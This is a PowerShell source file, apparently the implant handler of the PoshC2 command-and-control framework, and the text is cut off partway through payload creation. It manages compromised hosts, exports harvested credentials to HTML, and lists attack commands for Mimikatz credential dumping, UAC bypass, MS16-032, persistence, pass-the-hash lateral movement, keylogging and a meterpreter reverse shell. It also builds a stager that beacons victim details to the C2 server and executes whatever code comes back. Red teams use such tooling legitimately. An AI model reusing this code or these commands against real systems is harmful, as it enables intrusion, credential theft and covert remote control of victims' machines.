﻿<#
        .Synopsis
        Implant-Handler cmdlet for the PowershellC2 to manage and deliver commands
        .DESCRIPTION
        Implant-Handler cmdlet for the PowershellC2 to manage and deliver commands
        .EXAMPLE
        ImplantHandler -FolderPath C:\Temp\PoshC2-031120161055
#>
function Implant-Handler
{
    [CmdletBinding(DefaultParameterSetName = "FolderPath")]
    Param
    (
        [Parameter(ParameterSetName = "FolderPath", Mandatory = $false)]
        [string]
        $FolderPath,
        [string]
        $PoshPath
    )

    if (!$FolderPath) {
        $FolderPath = Read-Host -Prompt `n'Enter the root folder path of the Database/Project'
    }

    # initiate defaults
    $Database = "$FolderPath\PowershellC2.SQLite"
    $p = $env:PsModulePath
    $p += ";$PoshPath\"
    $global:randomuri = $null
    $global:cmdlineinput = 'PS >'
    $global:implants = $null
    $global:implantid = $null
    $global:command = $null
    [Environment]::SetEnvironmentVariable("PSModulePath",$p)
    Import-Module -Name PSSQLite
    Import-Module "$PoshPath\Modules\ConvertTo-Shellcode.ps1"

    $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
    $defaultbeacon = $c2serverresults.DefaultSleep
    $killdatefm = $c2serverresults.KillDate
    $IPAddress = $c2serverresults.HostnameIP 
    $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
    $ipv4address = $c2serverresults.HostnameIP
    $serverport = $c2serverresults.ServerPort 
        
$head = '
<style>

body {
font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
}

table {
    table-layout: fixed;
    word-wrap: break-word;
    display: table;
    font-family: monospace;
    white-space: pre;
    margin: 1em 0;
}

th, td {
    text-align: left;
    padding: 8px;
}

tr:nth-child(even){background-color: #f2f2f2}

th {
    background-color: #4CAF50;
    color: white;
}
 
p { 
margin-left: 20px; 
font-size: 12px; 
}
 
</style>'

$header = '
<pre>
  __________            .__.     _________  ________  
  \_______  \____  _____|  |__   \_   ___ \ \_____  \ 
   |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ 
   |    |  (  <_> )___ \|   Y  \ \     \____/       \ 
   |____|   \____/____  >___|  /  \______  /\_______ \
                      \/     \/          \/         \/
  ============ @benpturner & @davehardy20 ============
  ====================================================
</pre>'


    function startup 
    {
        Clear-Host
        $global:implants = $null
        $global:command = $null
        $global:randomuri = $null
        $global:implantid = $null
        $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE Alive='Yes'" -As PSObject
        $global:implants = $dbresults.RandomURI

        # while no implant is selected
        while ($global:randomuri -eq $null)
        {
            Clear-Host
            Write-Host -Object ""
            Write-Host -Object ".___.              .__.                __          " -ForegroundColor Green
            Write-Host -Object "|   | _____ ______ |  | _____    _____/  |_  ______" -ForegroundColor Green
            Write-Host -Object "|   |/     \\____ \|  | \__  \  /    \   __\/  ___/" -ForegroundColor Green
            Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
            Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
            Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
            Write-Host "============== v2.9 www.PoshC2.co.uk ==============" -ForegroundColor Green
            Write-Host "===================================================" `n -ForegroundColor Green

            foreach ($implant in $dbresults) 
            { 
                $randomurihost = $implant.RandomURI
                $implantid = $implant.ImplantID
                $im_arch = $implant.Arch
                $im_user = $implant.User
                $im_hostname = $implant.Hostname
                $im_lastseen = $implant.LastSeen
                $im_pid = $implant.PID
                $im_sleep = $implant.Sleep
                $im_domain = $implant.Domain
                if ($randomurihost) {
                    if (((get-date).AddMinutes(-10) -gt $implant.LastSeen) -and ((get-date).AddMinutes(-59) -lt $implant.LastSeen)){
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Yellow
                    }
                    elseif ((get-date).AddMinutes(-59) -gt $implant.LastSeen){
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Red
                    }
                    else {
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Green
                    } 
                }
            }

            if (($HelpOutput) -and ($HelpOutput -eq "PrintMainHelp")){
                print-mainhelp
                $HelpOutput = $Null
            } 

            if (($HelpOutput) -and ($HelpOutput -ne "PrintMainHelp")){
                Write-Host ""
                Write-Host $HelpOutput -ForegroundColor Green
                $HelpOutput = $Null
            }

            $global:implantid = Read-Host -Prompt `n'Select ImplantID or ALL or Comma Separated List (Enter to refresh):'
            Write-Host -Object ""
            if (!$global:implantid) 
            {
                startup
            }
            if ($global:implantid -eq "Help"){
               $HelpOutput = "PrintMainHelp"
               startup
            }
            elseif ($global:implantid -eq "?"){
               $HelpOutput = "PrintMainHelp"
               startup
            }
            elseif ($global:implantid.ToLower().StartsWith("set-defaultbeacon")) 
            {
                [int]$Beacon = $global:implantid -replace "set-defaultbeacon ",""                                
                $HelpOutput = "DefaultBeacon updated to: $Beacon" 
                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE C2Server SET DefaultSleep='$Beacon'"|Out-Null
                startup
            }
            elseif ($global:implantid -eq "automigrate-frompowershell")
            {
                $taskn = "LoadModule NamedPipe.ps1"
                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
                $taskm = "AutoMigrate"
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskn
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskp
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskm
                }
                $HelpOutput = "Added automigrate-frompowershell"
                startup      
            }
            elseif ($global:implantid -eq "AM")
            {
                $taskn = "LoadModule NamedPipe.ps1"
                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
                $taskm = "AutoMigrate"
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskn
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskp
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskm
                }
                $HelpOutput = "Added automigrate-frompowershell"
                startup      
            }
            elseif ($global:implantid -eq "L") 
            {
                $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                foreach ($i in $autorunlist) {
                    $taskid = $i.TaskID
                    $taskname = $i.Task
                    $HelpOutput += "TaskID: $taskid | Task: $taskname `n"
                }             
                startup
            }
            elseif ($global:implantid -eq "list-autorun") 
            {
                $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                foreach ($i in $autorunlist) {
                    $taskid = $i.TaskID
                    $taskname = $i.Task
                    $HelpOutput += "TaskID: $taskid | Task: $taskname `n"
                }             
                startup
            }
            elseif ($global:implantid -eq "nuke-autorun") 
            {
                Invoke-SqliteQuery -DataSource $Database -Query "Drop Table AutoRuns"
                
                $Query = 'CREATE TABLE AutoRuns (
                TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
                Task TEXT)'
                Invoke-SqliteQuery -Query $Query -DataSource $Database 
                startup
            }
            elseif ($global:implantid.ToLower().StartsWith("del-autorun")) 
            {
                $number = $global:implantid.Substring(12)
                $number = [int]$number
                if ($number  -match '^\d+$'){
                    Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM AutoRuns where TaskID='$number'"

                    $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                    foreach ($i in $autorunlist) {
                        $taskid = $i.TaskID
                        $taskname = $i.Task
                        $HelpOutput += "TaskID: $taskid | Task: $taskname"
                    }
                
                    startup    
                }
                else
                {  
                    $HelpOutput = "Error not an integer"
                    startup
                }
            }
            elseif ($global:implantid.ToLower().StartsWith("add-autorun")) 
            {
                $tasker = $global:implantid.Substring(12)
                write-host "$tasker" -ForegroundColor Cyan
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $tasker
                }
                $HelpOutput = "Added autorun $tasker"
                startup                
            } elseif ($global:implantid.ToLower().StartsWith("output-to-html"))
            {
                $allcreds = Invoke-SqliteQuery -Datasource $Database -Query "SELECT * FROM Creds" -As PSObject
                $CredsArray = @()
                foreach ($cred in $allcreds) {
                    $CredLog = New-object PSObject | Select  CredsID, Username, Password, Hash
                    $CredLog.CredsID = $cred.CredsID;
                    $Credlog.Username = $cred.Username;
                    $CredLog.Password = $cred.Password;
                    $CredLog.Hash = $cred.Hash;
                    $CredsArray += $CredLog
                }
                $CredsArray | ConvertTo-Html -title "<title>Credential List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Creds.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants" -As PSObject
               $ImplantsArray = @()
               foreach ($implantres in $allresults) {                  
                    $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
                    $ImplantLog.ImplantID = $implantres.ImplantID;
                    $ImplantLog.RandomURI = $implantres.RandomURI;
                    $ImplantLog.User = $implantres.User;
                    $ImplantLog.Hostname = $implantres.Hostname;
                    $ImplantLog.IPAddress = $implantres.IPAddress;
                    $ImplantLog.FirstSeen = $implantres.FirstSeen;
                    $ImplantLog.LastSeen = $implantres.LastSeen;
                    $ImplantLog.PID = $implantres.PID;
                    $ImplantLog.Arch = $implantres.Arch;
                    $ImplantLog.Domain = $implantres.Domain;
                    $ImplantLog.Sleep = $implantres.Sleep;
                    $ImplantsArray += $ImplantLog
               }

               $ImplantsArray | ConvertTo-Html -title "<title>Implant List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Implants.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks" -As PSObject
               $TasksArray = @()
               foreach ($task in $allresults) {                  
                    $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, RandomURI, Command, Output
                    $ImplantTask.TaskID = $task.CompletedTaskID;
                    $ImplantTask.Timestamp = $task.TaskID;
                    $ImplantTask.RandomURI = $task.RandomURI;
                    $ImplantTask.Command = $task.Command;
                    $ImplantTask.Output = $task.Output;
                    $TasksArray += $ImplantTask
               }
               $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\ImplantTasks.html"

               $HelpOutput = "Created three reports in $FolderPath\reports\*"
                
            } elseif ($global:implantid -eq "P")
            {
                start-process $FolderPath\payloads\payload.bat
                $HelpOutput = "Pwning self......"
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("pwnself"))
            {
                start-process $FolderPath\payloads\payload.bat
                $HelpOutput = "Pwning self......"
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("show-serverinfo"))
            {
                $HelpOutput  = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("createproxypayload")) 
            {
                $HelpOutput = IEX $global:implantid
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("creds")) 
            {
                $HelpOutput = IEX $global:implantid
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("listmodules")) 
            {
                Write-Host -Object "Reading modules from `$env:PSModulePath\* and $PoshPath\Modules\*"
                $folders = $env:PSModulePath -split ";" 
                foreach ($item in $folders) {
                    $PSmod = Get-ChildItem -Path $item -Include *.ps1 -Name
                    foreach ($mod in $PSmod)
                    {
                        $HelpOutput += $mod + "`n"
                    }
                }
                $listmodules = Get-ChildItem -Path "$PoshPath\Modules" -Name 
                foreach ($mod in $listmodules)
                {
                  $HelpOutput += $mod + "`n"
                }
                
                $HelpOutput
            }  
            elseif ($global:implantid.Contains(","))
            {
                $global:cmdlineinput = "PS $global:implantid>"
                break 
            } elseif ($global:implantid -eq "ALL") 
            {
                $global:cmdlineinput = "PS $global:implantid>"
                break
            } else 
            {
                $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$global:implantid'" -as SingleValue
                $global:cmdlineinput = "PS $global:implantid>"   
            }
        }
    }

    $tick = "'"
    $speechmarks = '"'

     function print-mainhelp {
        write-host `n "Main Menu: " -ForegroundColor Green
        write-host "================================" -ForegroundColor Red
        write-host " Use Implant by <id>, e.g. 1"-ForegroundColor Green
        write-host " Use Multiple Implants by <id>,<id>,<id>, e.g. 1,2,5"-ForegroundColor Green
        write-host " Use ALL Implants by ALL" -ForegroundColor Green
        write-host `n "Auto-Runs: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Add-autorun <task>"-ForegroundColor Green
        write-host " List-autorun (Alias: L)"-ForegroundColor Green
        write-host " Del-autorun <taskID>"-ForegroundColor Green
        write-host " Nuke-autorun"-ForegroundColor Green
        write-host " Automigrate-FromPowershell (Alias: AM)"-ForegroundColor Green
        write-host `n "Server Commands: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Show-ServerInfo" -ForegroundColor Green 
        write-host " Output-To-HTML"-ForegroundColor Green
        write-host " Set-DefaultBeacon 60"-ForegroundColor Green
        write-host " ListModules " -ForegroundColor Green
        write-host " PwnSelf (Alias: P)" -ForegroundColor Green
        write-host " Creds -Action <dump/add/del/search> -Username <username> -password/-hash"-ForegroundColor Green 
        write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green  
    }

    function print-help {
        write-host `n "Implant Features: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Beacon 60s / Beacon 10m / Beacon 2h"-ForegroundColor Green 
        write-host " Turtle 60s / Turtle 30m / Turtle 8h "-ForegroundColor Green 
        write-host " Kill-Implant"-ForegroundColor Green 
        write-host " Hide-Implant"-ForegroundColor Green 
        write-host " Unhide-Implant"-ForegroundColor Green 
        write-host " Invoke-Enum"-ForegroundColor Green 
        write-host " Get-Proxy"-ForegroundColor Green 
        write-host " Get-ComputerInfo"-ForegroundColor Green 
        write-host " Unzip <source file> <destination folder>"-ForegroundColor Green 
        write-host " Get-System" -ForegroundColor Green
        write-host " Get-System-WithProxy" -ForegroundColor Green 
        write-host " Get-ImplantWorkingDirectory"-ForegroundColor Green
        write-host " Get-Pid" -ForegroundColor Green 
        write-host " Get-Webpage http://intranet" -ForegroundColor Green 
        write-host " ListModules " -ForegroundColor Green
        write-host " ModulesLoaded " -ForegroundColor Green 
        write-host " LoadModule <modulename>" -ForegroundColor Green 
        write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
        write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
        write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
        write-host " StartAnotherImplantWithProxy or SAIWP" -ForegroundColor Green 
        write-host " Invoke-DaisyChain -port 80 -daisyserver http://192.168.1.1 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
        write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
        write-host " Get-MSHotfixes" -ForegroundColor Green 
        write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
        write-host " EnableRDP" -ForegroundColor Green
        write-host " DisableRDP" -ForegroundColor Green
        write-host " Netsh.exe advfirewall firewall add rule name=`"EnableRDP`" dir=in action=allow protocol=TCP localport=any enable=yes" -ForegroundColor Green
        write-host " Get-WLANPass" -ForegroundColor Green
        write-host " Get-WmiObject -Class Win32_Product" -ForegroundColor Green
        write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
        write-host `n "Privilege Escalation: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Invoke-AllChecks" -ForegroundColor Green
        write-host " Invoke-UACBypass" -ForegroundColor Green
        write-host " Invoke-UACBypassProxy" -ForegroundColor Green
        Write-Host ' Get-MSHotFixes | Where-Object {$_.hotfixid -eq "KB2852386"}' -ForegroundColor Green
        write-host " Invoke-MS16-032" -ForegroundColor Green 
        write-host " Invoke-MS16-032-ProxyPayload" -ForegroundColor Green 
        write-host " Get-GPPPassword" -ForegroundColor Green 
        write-host " Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'" -ForegroundColor Green
        write-host " Dir -Recurse | Select-String -pattern 'password='" -ForegroundColor Green
        write-host `n "File Management: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Download-File -Source 'C:\Temp Dir\Run.exe'" -ForegroundColor Green
        write-host " Download-Files -Directory 'C:\Temp Dir\'" -ForegroundColor Green
        write-host " Upload-File -Source 'C:\Temp\Run.exe' -Destination 'C:\Temp\Test.exe'" -ForegroundColor Green  
        write-host " Web-Upload-File -From 'http://www.example.com/App.exe' -To 'C:\Temp\App.exe' " -ForegroundColor Green 
        write-host `n "Persistence: " -ForegroundColor Green
        write-host "================" -ForegroundColor Red
        write-host " Install-Persistence 1,2,3 " -ForegroundColor Green 
        write-host " Remove-Persistence 1,2,3" -ForegroundColor Green 
        write-host " Install-ServiceLevel-Persistence | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
        write-host " Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
        write-host `n "Network Tasks / Lateral Movement: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host " Get-ExternalIP" -ForegroundColor Green
        write-host " Test-ADCredential -Domain test -User ben -Password Password1" -ForegroundColor Green 
        write-host " Invoke-SMBLogin -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Password" -ForegroundColor Green
        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
        write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
        write-host " Net View | Net Users | Whoami /groups | Whoami /priv | Net localgroup administrators | Net Accounts /dom" -ForegroundColor Green  
        write-host ' Get-NetUser -Filter | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
        write-host ' Get-NetUser -Filter samaccountname=test' -ForegroundColor Green 
        write-host ' Get-NetUser -Filter userprinciplename=test@test.com' -ForegroundColor Green 
        write-host ' Get-NetGroup | select samaccountname' -ForegroundColor Green
        write-host ' Get-NetGroup "*BEN*" | select samaccountname ' -ForegroundColor Green
        write-host ' Get-NetGroupMember "Domain Admins" -recurse|select membername' -ForegroundColor Green
        write-host `n "Domain Trusts: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host " Get-NetDomain | Get-NetDomainController | Get-NetForestDomain" -ForegroundColor Green 
        write-host " Invoke-MapDomainTrust" -ForegroundColor Green 
        write-host ' Get-NetUser -domain child.parent.com -Filter samaccountname=test' -ForegroundColor Green 
        write-host ' Get-NetGroup -domain child.parent.com | select samaccountname' -ForegroundColor Green 
        write-host `n "Other Network Tasks: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
        write-host " Get-BloodHoundData -CollectionMethod 'Stealth' | Export-BloodHoundCSV" -ForegroundColor Green
        write-host " Get-NetDomainController | Select name | get-netsession | select *username,*CName" -ForegroundColor Green
        write-host " Get-DFSshare | get-netsession | Select *username,*CName" -ForegroundColor Green
        write-host " Get-NetFileServer | get-netsession | Select *username,*CName" -ForegroundColor Green
        write-host " Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
        write-host " Get-DomainComputer -LDAPFilter `"(|(operatingsystem=*7*)(operatingsystem=*2008*))`" -SPN `"wsman*`" -Properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl" -ForegroundColor Green
        write-host " Write-SCFFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
        write-host " Write-INIFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
        write-host " Invoke-Hostscan -IPRangeCIDR 172.16.0.0/24 (Provides list of hosts with 445 open)" -ForegroundColor Green
        write-host " Invoke-ShareFinder -hostlist hosts.txt" -ForegroundColor Green
        write-host " Get-NetFileServer -Domain testdomain.com" -ForegroundColor Green
        write-host " Find-InterestingFile -Path \\SERVER\Share -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)" -ForegroundColor Green
        write-host " Brute-AD" -ForegroundColor Green 
        write-host " Brute-LocAdmin -Username administrator" -ForegroundColor Green 
        Write-Host " Get-PassPol" -ForegroundColor Green
        Write-Host " Get-PassNotExp" -ForegroundColor Green
        Write-Host " Get-LocAdm" -ForegroundColor Green
        Write-Host " Invoke-Pipekat -Target <ip-optional> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        Write-Host " Invoke-Inveigh -FileOutputDirectory C:\Temp\ -FileOutput Y -HTTP Y -Proxy Y -NBNS Y -Tool 1" -ForegroundColor Green
        Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB -LocalIP 10.10.10.10" -ForegroundColor Green
        Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
        Write-Host " Invoke-RunAs -cmd 'powershell.exe' -args 'start-service -name WinRM' -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
        Write-Host " Invoke-RunAsPayload -Domain <dom> -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
        Write-Host " Invoke-RunAsProxyPayload -Domain <dom> -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
        write-host " Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'" -ForegroundColor Green
        #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
        write-host "=========================================================" -ForegroundColor Red
        write-host " Invoke-Mimikatz | Out-String | Parse-Mimikatz" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::logonpasswords$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::lsa$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::cache$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)ts::multirdp$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)privilege::debug$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)crypto::capi$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)crypto::certificates /export$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Computer 10.0.0.1 -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-TokenManipulation | Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize | Out-String" -ForegroundColor Green
        write-host ' Invoke-TokenManipulation -ImpersonateUser -Username "Domain\User"' -ForegroundColor Green
        write-host `n "Credentials / Domain Controller Hashes: " -ForegroundColor Green
        write-host "============================================" -ForegroundColor Red
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::dcsync /domain:domain.local /user:administrator$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-DCSync -PWDumpFormat" -ForegroundColor Green
        write-host " Dump-NTDS -EmptyFolder <emptyfolderpath>" -ForegroundColor Green
        write-host `n "Useful Modules: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Show-ServerInfo" -ForegroundColor Green 
        write-host " Get-Screenshot" -ForegroundColor Green
        write-host " Get-ScreenshotMulti -Timedelay 120 -Quantity 30" -ForegroundColor Green
        write-host " Get-RecentFiles" -ForegroundColor Green
        write-host " Cred-Popper" -ForegroundColor Green 
        write-host " Hashdump" -ForegroundColor Green 
        write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
        write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
        write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
        write-host " Migrate-x64" -ForegroundColor Green
        write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
        write-host " Migrate-x64 -NewProcess C:\Windows\System32\netsh.exe" -ForegroundColor Green
        write-host " Migrate-x86 -ProcName lsass" -ForegroundColor Green
        write-host " Migrate-Proxypayload-x86 -ProcID 4444" -ForegroundColor Green
        write-host " Migrate-Proxypayload-x64 -ProcName notepad" -ForegroundColor Green
        write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
        write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
        write-host ' Send-MailMessage -to "itdept@test.com" -from "User01 <user01@example.com>" -subject <> -smtpServer <> -Attachment <>'-ForegroundColor Green
        write-host `n "Implant Handler: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Back" -ForegroundColor Green 
        write-host " Exit" `n -ForegroundColor Green 
    }

    # call back command
    $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function Get-Webclient ($Cookie) {
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
if ($k -lt $d) {exit} 
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
$h="'+$domainfrontheader+'"
if ($h) {$wc.Headers.Add("Host",$h)}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
} $wc }
function primer {
if ($env:username -eq $env:computername+"$"){$u="SYSTEM"}else{$u=$env:username}
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient -Cookie $p64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'

        function Get-RandomURI 
    {
        param (
            [int]$Length
        )
        $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
        $result = ''
        for ($x = 0; $x -lt $Length; $x++) 
        {
            $result += $set | Get-Random
        }
        return $result
    }

    # create payloads
    function CreatePayload 
    {
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
